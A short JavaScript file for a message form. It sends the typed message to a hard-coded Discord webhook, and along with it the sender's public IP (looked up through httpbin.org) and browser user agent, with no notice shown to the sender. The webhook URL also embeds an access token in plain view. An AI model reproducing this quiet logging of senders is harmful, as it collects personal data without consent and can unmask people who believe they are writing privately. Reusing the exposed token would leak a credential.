var params=new URLSearchParams(window.location.search);
var user=params.get("para");
document.querySelector("span").innerText=user;
async function enviar(){
  
  var webhook="https://discord.com/api/webhooks/1369053203542315112/PoOeV-T_Q2LqUFw_Ts1FSzgSLAmB5BouBY0IraAcuLmkZtffNgXE3rBiamrA0tIEqnQV";
  
  
  
  var texto=document.querySelector("textarea").value;
  console.log(texto);
  if(texto.length<5){
    alert("Insira mais conteúdo no campo de texto.");
  }
  else{
    var resp=await fetch("https://httpbin.org/ip");
    var ip=await resp.json();
    ip=ip.origin;
    var userAgent=navigator.userAgent;
    msg={content:"=======\n"+"IP: "+ip+"\nUser-Agent: "+userAgent+"\n\nMensagem:\n"+texto+"\n\n======="};
    await fetch(webhook,{
      "method":"POST",
      "headers": {"Content-Type":"application/json"},
      body: JSON.stringify(msg)
    }
    );
    setTimeout(function(){
      alert("Mensagem enviada");
      texto="";
    },2000);
    
    
    
  }
}
